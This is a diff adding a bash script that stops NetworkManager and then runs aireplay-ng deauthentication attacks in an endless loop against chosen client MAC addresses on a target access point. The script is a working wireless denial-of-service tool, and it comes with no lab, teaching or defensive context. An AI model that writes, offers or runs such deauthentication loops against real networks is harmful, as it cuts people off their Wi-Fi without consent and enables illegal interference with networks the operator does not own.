@@ -1,0 +1,45 @@
+#!/bin/bash
+
+exitter() {
+  printf "\nExitting...\n"
+  sudo killall aireplay-ng &>/dev/null
+  sudo systemctl start NetworkManager &>/dev/null
+  sleep 0.5
+  exit 0;
+}
+
+trap exitter INT
+
+if [[ "$EUID" -ne 0 ]]; then
+  echo "Please run as root" 1>&2
+  exit 1
+fi
+
+if [[ $# -eq 0 ]] || ! ip -c=never addr | grep -P "^\d+: $1:" > /dev/null; then
+  echo "Please provide device" 1>&2
+  exit 1
+fi
+
+if [[ $# -eq 1 ]]; then
+  echo "Please provide Access Point MAC address" 1>&2
+  exit 1
+fi
+
+if [[ $# -eq 2 ]]; then
+  echo "Please provide at least one destination Mac address" 1>&2
+  exit 1
+fi
+
+device=$1
+accessPoint=$2
+macs=${@:3}
+
+sudo systemctl stop NetworkManager
+
+while true; do
+  for mac in $macs; do
+    sudo aireplay-ng -0 2 -a $accessPoint -c $mac $device &
+    sleep 1.5
+  done
+done
+
